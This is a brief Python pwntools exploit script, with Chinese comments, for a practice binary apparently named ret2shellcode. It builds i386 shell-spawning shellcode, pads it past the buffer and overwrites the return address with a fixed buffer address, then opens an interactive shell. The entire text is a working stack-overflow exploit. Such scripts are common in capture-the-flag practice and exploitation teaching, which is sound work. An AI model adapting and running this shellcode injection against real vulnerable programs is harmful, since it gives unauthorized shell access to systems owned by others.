#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
# 设置生成shellcode的环境
context(arch='i386', os='linux')
shellcode = asm(shellcraft.sh())
print("shellcode length:", len(shellcode))
buf2_addr = 0x804a080

# ljust: 填充shellcode至指定字节
sh.sendline(shellcode.ljust(0x6c + 4, b'A') + p32(buf2_addr))
sh.interactive()